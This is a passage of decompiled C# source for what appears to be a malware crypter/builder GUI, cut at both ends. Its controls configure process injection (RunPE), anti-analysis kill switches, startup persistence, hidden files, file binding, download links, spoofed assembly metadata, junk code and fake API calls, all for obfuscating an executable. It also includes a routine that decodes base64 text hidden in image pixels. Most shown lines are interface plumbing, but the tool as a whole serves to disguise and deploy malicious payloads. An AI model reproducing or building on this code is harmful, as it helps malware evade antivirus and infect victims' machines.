                    text += Convert.ToChar(color.R);
                }
            }
            text = text.Replace("\\", "");
            text = text.Trim(new char[]
   {
       Convert.ToChar(0)
   });
            byte[] bytes = Convert.FromBase64String(text);
            text = Encoding.UTF8.GetString(bytes);
            return text;
        }






















        /// <summary>
        /// //////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>



        private void picEnc_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.picEnc.DoDragDrop(this.picEnc.Image, DragDropEffects.All);
            }
        }
        private void picMn_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.picMn.DoDragDrop(this.picMn.Image, DragDropEffects.All);
            }
        }
        private void picRest_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.picRest.DoDragDrop(this.picRest.Image, DragDropEffects.All);
            }
        }
        private void picRunPE_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.picRunPE.DoDragDrop(this.picRunPE.Image, DragDropEffects.All);
            }
        }




        private void pic1_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                if (this.pic3.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic3.Image = null;
                }
                if (this.pic2.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic2.Image = null;
                }
                if (this.pic4.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic4.Image = null;
                }
                this.pic1.Image = (Bitmap)e.Data.GetData(DataFormats.Bitmap);
            }
        }
        private void pic1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                e.Effect = DragDropEffects.Copy;
                return;
            }
            e.Effect = DragDropEffects.None;
        }
        private void pic2_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                if (this.pic3.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic3.Image = null;
                }
                if (this.pic1.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic1.Image = null;
                }
                if (this.pic4.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic4.Image = null;
                }
                this.pic2.Image = (Bitmap)e.Data.GetData(DataFormats.Bitmap);
            }
        }
        private void pic2_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                e.Effect = DragDropEffects.Copy;
                return;
            }
            e.Effect = DragDropEffects.None;
        }
        private void pic3_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                if (this.pic1.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic1.Image = null;
                }
                if (this.pic2.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic2.Image = null;
                }
                if (this.pic4.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic4.Image = null;
                }
                this.pic3.Image = (Bitmap)e.Data.GetData(DataFormats.Bitmap);
            }
        }
        private void pic3_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                e.Effect = DragDropEffects.Copy;
                return;
            }
            e.Effect = DragDropEffects.None;
        }
        private void pic4_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                if (this.pic1.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic1.Image = null;
                }
                if (this.pic2.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic2.Image = null;
                }
                if (this.pic3.Image == (Bitmap)e.Data.GetData(DataFormats.Bitmap))
                {
                    this.pic3.Image = null;
                }
                this.pic4.Image = (Bitmap)e.Data.GetData(DataFormats.Bitmap);
            }
        }
        private void pic4_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Bitmap))
            {
                e.Effect = DragDropEffects.Copy;
                return;
            }
            e.Effect = DragDropEffects.None;
        }
        private void lstBind_DragDrop(object sender, DragEventArgs e)
        {
            this.lstBind.Items.Add(((Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString());
        }
        private void lstBind_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
            }
        }







        private void b12232324_Click(object sender, EventArgs e)
        {
              this.method_3();
   this.method_29();
   this.method_22();
   string name;
   if ((name = (sender as Control12).Name) != null)
   {
       if (method0x60000af == null)
       {
           Dictionary<string, int> expr_37 = new Dictionary<string, int>(12);
           expr_37.Add("b1", 0);
           expr_37.Add("b2", 1);
           expr_37.Add("b3", 2);
           expr_37.Add("b4", 3);
           expr_37.Add("b5", 4);
           expr_37.Add("b6", 5);
           expr_37.Add("b7", 6);
           expr_37.Add("b8", 7);
           expr_37.Add("b9", 8);
           expr_37.Add("b10", 9);
           expr_37.Add("b11", 10);
           expr_37.Add("b12", 11);
           method0x60000af = expr_37;
       }
       int num;
       if (method0x60000af.TryGetValue(name, out num))
       {
           switch (num)
           {
               case 0:
               {
                   this.pan1.Visible = false;
                   this.pan7.Visible = false;
                   this.pan5.Visible = false;
                   this.pan9.Visible = false;
                   this.pan10.Visible = false;
                   this.pan11.Visible = false;
                   this.pan12.Visible = false;
                   AnimateWindow(this.pan4.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
                   this.pan4.Visible = true;
                   IEnumerator enumerator = this.pan4.Controls.GetEnumerator();
                   try
                   {
                       while (enumerator.MoveNext())
                       {
                           Control control = (Control)enumerator.Current;
                           control.Refresh();
                       }
                       return;
                   }
                   finally
                   {
                       IDisposable disposable = enumerator as IDisposable;
                       if (disposable != null)
                       {
                           disposable.Dispose();
                       }
                   }
                   break;
               }
               case 1:
               {
                   break;
               }
               case 2:
               {
                   goto IL_2BC;
               }
               case 3:
               {
                   goto IL_384;
               }
               case 4:
               {
                   goto IL_440;
               }
               case 5:
               {
                   goto IL_51E;
               }
               case 6:
               {
                   goto IL_5E6;
               }
               case 7:
               {
                   goto IL_6EA;
               }
               case 8:
               {
                   goto IL_7B2;
               }
               case 9:
               {
                   goto IL_8CC;
               }
               case 10:
               {
                   goto IL_9C4;
               }
               case 11:
               {
                   goto IL_AD2;
               }
               default:
               {
                   return;
               }
           }
           this.pan2.Location = this.pan1.Location;
           this.pan1.Visible = false;
           this.pan7.Visible = false;
           this.pan5.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan2.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan2.Visible = true;
           IEnumerator enumerator2 = this.pan2.Controls.GetEnumerator();
           try
           {
               while (enumerator2.MoveNext())
               {
                   Control control2 = (Control)enumerator2.Current;
                   control2.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable2 = enumerator2 as IDisposable;
               if (disposable2 != null)
               {
                   disposable2.Dispose();
               }
           }
           IL_2BC:
           this.pan1.Visible = false;
           this.pan7.Visible = false;
           this.pan5.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan3.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan3.Visible = true;
           IEnumerator enumerator3 = this.pan3.Controls.GetEnumerator();
           try
           {
               while (enumerator3.MoveNext())
               {
                   Control control3 = (Control)enumerator3.Current;
                   control3.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable3 = enumerator3 as IDisposable;
               if (disposable3 != null)
               {
                   disposable3.Dispose();
               }
           }
           IL_384:
           this.pan7.Visible = false;
           this.pan5.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan1.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan1.Visible = true;
           IEnumerator enumerator4 = this.pan1.Controls.GetEnumerator();
           try
           {
               while (enumerator4.MoveNext())
               {
                   Control control4 = (Control)enumerator4.Current;
                   control4.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable4 = enumerator4 as IDisposable;
               if (disposable4 != null)
               {
                   disposable4.Dispose();
               }
           }
           IL_440:
           this.pan1.Visible = false;
           this.pan7.Visible = false;
           this.pan8.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           this.pan5.Location = this.pan4.Location;
           AnimateWindow(this.pan5.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan5.Visible = true;
           IEnumerator enumerator5 = this.pan5.Controls.GetEnumerator();
           try
           {
               while (enumerator5.MoveNext())
               {
                   Control control5 = (Control)enumerator5.Current;
                   control5.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable5 = enumerator5 as IDisposable;
               if (disposable5 != null)
               {
                   disposable5.Dispose();
               }
           }
           IL_51E:
           this.pan1.Visible = false;
           this.pan7.Visible = false;
           this.pan5.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan6.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan6.Visible = true;
           IEnumerator enumerator6 = this.pan6.Controls.GetEnumerator();
           try
           {
               while (enumerator6.MoveNext())
               {
                   Control control6 = (Control)enumerator6.Current;
                   control6.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable6 = enumerator6 as IDisposable;
               if (disposable6 != null)
               {
                   disposable6.Dispose();
               }
           }
           IL_5E6:
           this.pan1.Visible = false;
           this.pan1.Visible = false;
           this.pan2.Visible = false;
           this.pan3.Visible = false;
           this.pan4.Visible = false;
           this.pan6.Visible = false;
           this.pan8.Visible = false;
           this.pan5.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan7.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan7.Visible = true;
           IEnumerator enumerator7 = this.pan7.Controls.GetEnumerator();
           try
           {
               while (enumerator7.MoveNext())
               {
                   Control control7 = (Control)enumerator7.Current;
                   control7.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable7 = enumerator7 as IDisposable;
               if (disposable7 != null)
               {
                   disposable7.Dispose();
               }
           }
           IL_6EA:
           this.pan1.Visible = false;
           this.pan5.Visible = false;
           this.pan7.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan8.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan8.Visible = true;
           IEnumerator enumerator8 = this.pan8.Controls.GetEnumerator();
           try
           {
               while (enumerator8.MoveNext())
               {
                   Control control8 = (Control)enumerator8.Current;
                   control8.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable8 = enumerator8 as IDisposable;
               if (disposable8 != null)
               {
                   disposable8.Dispose();
               }
           }
           IL_7B2:
           this.pan1.Visible = false;
           this.pan9.Location = this.pan1.Location;
           this.pan1.Visible = false;
           this.pan2.Visible = false;
           this.pan3.Visible = false;
           this.pan4.Visible = false;
           this.pan6.Visible = false;
           this.pan8.Visible = false;
           this.pan5.Visible = false;
           this.pan7.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan9.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan9.Visible = true;
           IEnumerator enumerator9 = this.pan9.Controls.GetEnumerator();
           try
           {
               while (enumerator9.MoveNext())
               {
                   Control control9 = (Control)enumerator9.Current;
                   control9.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable9 = enumerator9 as IDisposable;
               if (disposable9 != null)
               {
                   disposable9.Dispose();
               }
           }
           IL_8CC:
           this.pan1.Visible = false;
           this.pan2.Visible = false;
           this.pan3.Visible = false;
           this.pan4.Visible = false;
           this.pan6.Visible = false;
           this.pan8.Visible = false;
           this.pan5.Visible = false;
           this.pan7.Visible = false;
           this.pan9.Visible = false;
           this.pan12.Visible = false;
           this.pan11.Visible = false;
           AnimateWindow(this.pan10.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan10.Visible = true;
           IEnumerator enumerator10 = this.pan10.Controls.GetEnumerator();
           try
           {
               while (enumerator10.MoveNext())
               {
                   Control control10 = (Control)enumerator10.Current;
                   control10.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable10 = enumerator10 as IDisposable;
               if (disposable10 != null)
               {
                   disposable10.Dispose();
               }
           }
           IL_9C4:
           this.pan1.Visible = false;
           this.pan11.Location = this.pan1.Location;
           this.pan2.Visible = false;
           this.pan3.Visible = false;
           this.pan4.Visible = false;
           this.pan6.Visible = false;
           this.pan8.Visible = false;
           this.pan5.Visible = false;
           this.pan7.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan12.Visible = false;
           AnimateWindow(this.pan11.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.pan11.Visible = true;
           IEnumerator enumerator11 = this.pan11.Controls.GetEnumerator();
           try
           {
               while (enumerator11.MoveNext())
               {
                   Control control11 = (Control)enumerator11.Current;
                   control11.Refresh();
               }
               return;
           }
           finally
           {
               IDisposable disposable11 = enumerator11 as IDisposable;
               if (disposable11 != null)
               {
                   disposable11.Dispose();
               }
           }
           IL_AD2:
           this.pan1.Visible = false;
           this.pan12.Location = this.pictureBox3.Location;
           this.pan2.Visible = false;
           this.pan3.Visible = false;
           this.pan4.Visible = false;
           this.pan6.Visible = false;
           this.pan8.Visible = false;
           this.pan5.Visible = false;
           this.pan7.Visible = false;
           this.pan9.Visible = false;
           this.pan10.Visible = false;
           this.pan11.Visible = false;
           AnimateWindow(this.pan12.Handle, 400, Enum3.flag_0 | Enum3.flag_7);
           this.lstProc.Visible = true;
           this.pan12.Visible = true;
           foreach (Control control12 in this.pan11.Controls)
           {
               control12.Refresh();
           }
       
   }
}

        }

        private void btnClearPic_Click(object sender, EventArgs e)
        {
            this.pic1.Image = null;
            this.pic2.Image = null;
            this.pic3.Image = null;
            this.pic4.Image = null;

        }

        private void btnLoad_Click(object sender, EventArgs e)
        {
            if (this.rdbLoad1.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\set1.txt"))
                {
                    this.method_4(File.ReadAllText(Application.StartupPath + "\\set1.txt"), 1);
                }
                else
                {
                    this.method_5("Settings 1 is not avaliable");
                }
            }
            if (this.rdbLoad2.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\set2.txt"))
                {
                    this.method_4(File.ReadAllText(Application.StartupPath + "\\set2.txt"), 2);
                }
                else
                {
                    this.method_5("Settings 2 is not avaliable");
                }
            }
            if (this.rdbLoad3.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\set3.txt"))
                {
                    this.method_4(File.ReadAllText(Application.StartupPath + "\\set3.txt"), 3);
                }
                else
                {
                    this.method_5("Settings 3 is not avaliable");
                }
            }
            if (this.rdbLoadCustom.Checked)
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    this.method_4(File.ReadAllText(openFileDialog.FileName), 4);
                }
            }

        }

        private void chckAnties_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckAnties.Checked)
            {
                this.rdbKill.Enabled = true;
                this.rdbKillExit.Enabled = true;
                this.rdbExit.Enabled = true;
                return;
            }
            this.rdbKill.Enabled = false;
            this.rdbKillExit.Enabled = false;
            this.rdbExit.Enabled = false;

        }

        private void chckAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckAssembly.Checked)
            {
                this.textAssemblyCopyRight.Enabled = true;
                this.textAssemblyDescription.Enabled = true;
                this.textAssemblyProduct.Enabled = true;
                this.txtAssemblyTitle.Enabled = true;
                this.textAssemblyCompany.Enabled = true;
                this.intMajor.Enabled = true;
                this.intMinor.Enabled = true;
                this.intBuild.Enabled = true;
                this.intRevision.Enabled = true;
                this.AssemblyLenght.Enabled = true;
                this.muButton11.Enabled = true;
                return;
            }
            this.textAssemblyCopyRight.Enabled = false;
            this.textAssemblyDescription.Enabled = false;
            this.textAssemblyProduct.Enabled = false;
            this.txtAssemblyTitle.Enabled = false;
            this.textAssemblyCompany.Enabled = false;
            this.intMajor.Enabled = false;
            this.intMinor.Enabled = false;
            this.intBuild.Enabled = false;
            this.intRevision.Enabled = false;
            this.AssemblyLenght.Enabled = false;
            this.muButton11.Enabled = false;

        }

        private void chckBatch_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckBatch.Enabled)
            {
                this.txtBatch2.Enabled = true;
                return;
            }
            this.txtBatch2.Enabled = false;

        }

        private void chckDelay_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckDelay.Checked)
            {
                this.rdbMinutes.Enabled = true;
                this.rdbSeconds.Enabled = true;
                this.numUpDownDelay.Enabled = true;
                return;
            }
            this.rdbMinutes.Enabled = false;
            this.rdbSeconds.Enabled = false;
            this.numUpDownDelay.Enabled = false;

        }

        private void chckNETfile_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckDelay.Checked)
            {
                this.rdbMinutes.Enabled = true;
                this.rdbSeconds.Enabled = true;
                this.numUpDownDelay.Enabled = true;
                return;
            }
            this.rdbMinutes.Enabled = false;
            this.rdbSeconds.Enabled = false;
            this.numUpDownDelay.Enabled = false;

        }

        private void chckSubFolder_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckSubFolder.Checked)
            {
                this.txtSubFolder.Enabled = true;
                this.deumosButton2.Enabled = true;
                return;
            }
            this.txtSubFolder.Enabled = false;
            this.deumosButton2.Enabled = false;

        }

        private void chckSUp2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chckSUp2.Checked)
            {
                this.groupBox3.Enabled = true;
                this.rdbStart1.Enabled = true;
                this.rdbStart2.Enabled = true;
                this.txtFileNameSU.Enabled = true;
                this.textBoxStartup2.Enabled = true;
                return;
            }
            this.groupBox3.Enabled = false;
            this.rdbStart1.Enabled = false;
            this.rdbStart2.Enabled = false;
            this.chckSubFolder.Enabled = false;
            this.txtFileNameSU.Enabled = false;
            this.textBoxStartup2.Enabled = false;

        }

        private void chkFakeAPI_CheckedChanged(object sender, EventArgs e)
        {
            this.trkFakeApi.Enabled = !this.trkFakeApi.Enabled;
            this.numRandomStringLength.Enabled = !this.numRandomStringLength.Enabled;

        }

        private void chkJunkCode_CheckedChanged(object sender, EventArgs e)
        {
            this.trkJunkCode.Enabled = !this.trkJunkCode.Enabled;
            this.chkArrayVariables.Enabled = !this.chkArrayVariables.Enabled;

        }

        private void deumosButton1_Click(object sender, EventArgs e)
        {
            Random random = new Random();
            if (this.rdbmutletters.Checked)
            {
                this.txtMutex.Text = this.method_35((double)random.Next(15, 30));
                return;
            }
            this.txtMutex.Text = this.method_25(random.Next(15, 30));

        }

        private void deumosButton2_Click(object sender, EventArgs e)
        {
            this.txtSubFolder.Text = this.method_35((double)this.random_0.Next(4, 10));


        }

        private void muButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void muButton2_Click(object sender, EventArgs e)
        {
            this.txtIcon.Clear();
            this.pictureBox1.Image.Dispose();
            this.pictureBox1.Image = null;

        }

        private void muButton3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Icon|*.ico";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.txtIcon.Text = openFileDialog.FileName;
                this.pictureBox1.Image = Icon.ExtractAssociatedIcon(this.txtIcon.Text).ToBitmap();
            }

        }

        private void muButton4_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Any File|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.lstBind.Items.Add(openFileDialog.FileName);
            }

        }

        private void muButton5_Click(object sender, EventArgs e)
        {
            this.lstBind.Items.Remove(this.lstBind.SelectedItem);


        }

        private void muButton6_Click(object sender, EventArgs e)
        {
            this.lstDownloadLinks.Items.Add(this.txtDownloadLink.Text);
            this.method_3();

        }

        private void muButton7_Click(object sender, EventArgs e)
        {
            this.lstDownloadLinks.Items.Remove(this.lstDownloadLinks.SelectedItem);
            this.method_3();

        }

        private void muButton8_Click(object sender, EventArgs e)
        {
            this.lstDownloadLinks.Items.Clear();
            this.method_3();

        }

        private void muButton9_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable|*.exe";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.txtCryptFile.Text = openFileDialog.FileName;
            }
            if (smethod_5(openFileDialog.FileName))
            {
                this.chckNETfile.Checked = true;
            }

        }

        private void muButton10_Click(object sender, EventArgs e)
        {
            this.txtCryptFile.Text = string.Empty;

        }

        private void muButton11_Click(object sender, EventArgs e)
        {
            this.method_34();

        }

        private void muButton12_Click(object sender, EventArgs e)
        {
            if (this.txtProcess.Text.ToString() == string.Empty)
            {
                return;
            }
            this.lstProc.Items.Add(this.txtProcess.Text);

        }

        private void muButton13_Click(object sender, EventArgs e)
        {
            this.lstProc.Items.Remove(this.lstProc.SelectedItem);

        }

        private void muButton14_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = ".Exe|*.exe";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                Assembly.LoadFrom(openFileDialog.FileName);
            }

        }

        private void muButton15_Click(object sender, EventArgs e)
        {
            this.lstBind.Items.Clear();

        }

        private void muButton16_Click(object sender, EventArgs e)
        {
            string text = string.Empty;
            text = text + this.txtCryptFile.Text + "»";
            if (this.txtIcon.Text != string.Empty)
            {
                text = text + this.txtIcon.Text + "»";
            }
            else
            {
                text += "noicon»";
            }
            text = text + this.txtInjectInto.Text + "»";
            foreach (Control control in this.grpEncryption.Controls)
            {
                if ((control as RadioButton).Checked)
                {
                    text = text + (control as RadioButton).Name.Replace("rdb", "").Replace("2", "") + "»";
                }
            }
            foreach (Control control2 in this.groupBox21.Controls)
            {
                if ((control2 as RadioButton).Checked)
                {
                    if ((control2 as RadioButton).Name.Contains("Letter"))
                    {
                        text += "letters»";
                    }
                    if ((control2 as RadioButton).Name.Contains("Unicode"))
                    {
                        text += "unicode»";
                    }
                    if ((control2 as RadioButton).Name.Contains("Chin"))
                    {
                        text += "chinese»";
                    }
                }
            }
            foreach (Control control3 in this.groupEnc2.Controls)
            {
                if ((control3 as RadioButton).Checked)
                {
                    text = text + (control3 as RadioButton).Name.Replace("rdb", "").Replace("2", "") + "»";
                }
            }
            foreach (Control control4 in this.groupBox21.Controls)
            {
                if ((control4 as RadioButton).Checked)
                {
                    if ((control4 as RadioButton).Name.Contains("Letter"))
                    {
                        text += "letters»";
                    }
                    if ((control4 as RadioButton).Name.Contains("Unicode"))
                    {
                        text += "unicode»";
                    }
                    if ((control4 as RadioButton).Name.Contains("Chin"))
                    {
                        text += "chinese»";
                    }
                }
            }
            if (this.chckEOF.Checked)
            {
                text += "yes»";
            }
            else
            {
                text += "null»";
            }
            if (this.chckHideFile.Checked)
            {
                text += "yes»";
            }
            else
            {
                text += "null»";
            }
            if (this.chckSUp2.Checked)
            {
                text += "yes»";
                text = text + this.textBoxStartup2.Text + "»";
                text = text + this.txtFileNameSU.Text + "»";
            }
            else
            {
                text += "null»";
                text += "null»";
                text += "null»";
            }
            if (this.chckDelay.Checked)
            {
                text += "yes»";
                text = text + this.numUpDownDelay.Value.ToString() + "»";
                if (this.rdbSeconds.Checked)
                {
                    text += "sec»";
                }
                else
                {
                    text += "min»";
                }
            }
            else
            {
                text += "null»null»null»";
            }
            if (this.chckAssembly.Checked)
            {
                text += "yes»";
                text = text + this.txtAssemblyTitle.Text + "»";
                text = text + this.textAssemblyDescription.Text + "»";
                text = text + this.textAssemblyCompany.Text + "»";
                text = text + this.textAssemblyProduct.Text + "»";
                text = text + this.textAssemblyCopyRight.Text + "»";
                text = text + this.intMajor.Value.ToString() + "»";
                text = text + this.intMinor.Value.ToString() + "»";
                text = text + this.intBuild.Value.ToString() + "»";
                text = text + this.intRevision.Value.ToString() + "»";
            }
            else
            {
                text += "null»null»null»null»null»null»null»null»null»null»";
            }
            foreach (RadioButton radioButton in this.groupBox8.Controls)
            {
                if (radioButton.Checked)
                {
                    text = text + radioButton.Name.Replace("rdb", "") + "»";
                }
            }
            if (this.rdbUnicode.Checked)
            {
                text = text + "unicode»" + this.numRandomStringLength.Value.ToString() + "»";
            }
            else
            {
                text = text + "letter»" + this.numRandomStringLength.Value.ToString() + "»";
            }
            if (this.chkJunkCode.Checked)
            {
                text += "yes»";
                if (this.chkArrayVariables.Checked)
                {
                    text += "yes»";
                }
                else
                {
                    text += "no»";
                }
                text = text + this.trkJunkCode.Int32_4.ToString() + "»";
            }
            else
            {
                text += "no»no»null»";
            }
            if (this.chkFakeAPI.Checked)
            {
                text = text + "yes»" + this.trkFakeApi.Int32_4.ToString() + "»";
                text = text + this.numRandomStringLength.Value.ToString() + "»";
            }
            else
            {
                text += "no»null»null»";
            }
            if (this.rdbSave1.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\Set1.txt"))
                {
                    File.Delete(Application.StartupPath + "\\Set1.txt");
                }
                File.WriteAllText(Application.StartupPath + "\\Set1.txt", text);
                this.method_5("Saved as setting 1!");
            }
            if (this.rdbSave2.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\Set2.txt"))
                {
                    File.Delete(Application.StartupPath + "\\Set2.txt");
                }
                File.WriteAllText(Application.StartupPath + "\\Set2.txt", text);
                this.method_5("Saved as setting 2!");
            }
            if (this.rdbSave3.Checked)
            {
                if (File.Exists(Application.StartupPath + "\\Set3.txt"))
                {
                    File.Delete(Application.StartupPath + "\\Set3.txt");
                }
                File.WriteAllText(Application.StartupPath + "\\Set3.txt", text);
                this.method_5("Saved as setting 3!");
            }
            if (this.rdbSaveCustom.Checked)
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, text);
                    this.method_5("Saved in: " + saveFileDialog.FileName + " !");
                }
            }

        }

        private void RandActiveX_Click(object sender, EventArgs e)
        {
            string text = "-";
            string text2 = this.method_51(6, 7);
            string text3 = this.method_51(5, 6);
            string text4 = this.method_51(5, 6);
            string text5 = this.method_51(5, 6);
            string text6 = this.method_51(9, 10);
            string text7 = string.Concat(new string[]
   {
       "{", 
       text2, 
       text, 
       text3, 
       text, 
       text4, 
       text, 
       text5, 
       text, 
       text6, 
       "}"
   });
            this.txtActiveXKey.Text = text7;

        }

        private void rdbChinKey_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbChinKey.Checked)
            {
                this.randomPool1.String_0 = "吧爸八百北不大岛的弟地东都对多儿二方港哥个关贵国过海好很会家见叫姐京九可老李零六吗妈么没美妹们明名哪那南你您朋七起千去人认日三上谁什生师识十是四他她台天湾万王我五西息系先香想小谢姓休学也一亿英友月再张这中字";
            }

        }

        private void rdbChinKey2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbChinKey2.Checked)
            {
                this.randomPool2.String_0 = "吧爸八百北不大岛的弟地东都对多儿二方港哥个关贵国过海好很会家见叫姐京九可老李零六吗妈么没美妹们明名哪那南你您朋七起千去人认日三上谁什生师识十是四他她台天湾万王我五西息系先香想小谢姓休学也一亿英友月再张这中字";
            }

        }

        private void rdbCryptNormal_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbCryptNormal.Checked)
            {
                this.grpStorage.Enabled = false;
                return;
            }
            this.grpStorage.Enabled = true;

        }

        private void rdbLettersKey_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbLettersKey.Checked)
            {
                this.randomPool1.String_0 = "0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            }


        }

        private void rdbLetterKey2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbLetterKey2.Checked)
            {
                this.randomPool2.String_0 = "0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            }

        }

      

        

        private void rdbUnicodeKey_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbUnicodeKey.Checked)
            {
                this.randomPool1.String_0 = "ƀƁƂƄƅƆƈƉƋƍƎƏƐƑƒƓƔƕƖƗƘƙƜƛơƣƥƪƩƱƲƳƴǍǎǢǣǤǥǭȄȜȞȣȮփռպֆԄӸӂҿҧ";
            }

        }

        private void rdbUnicodeKey2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbUnicodeKey2.Checked)
            {
                this.randomPool2.String_0 = "ƀƁƂƄƅƆƈƉƋƍƎƏƐƑƒƓƔƕƖƗƘƙƜƛơƣƥƪƩƱƲƳƴǍǎǢǣǤǥǭȄȜȞȣȮփռպֆԄӸӂҿҧ";
            }

        }

        private void btnCrypt_Click(object sender, EventArgs e)
        {
            string text = this.method_8(10);
            string str = this.method_8(this.random_0.Next(5, 10));
            ResourceWriter resourceWriter = new ResourceWriter(Application.StartupPath + "\\" + text + ".resources");
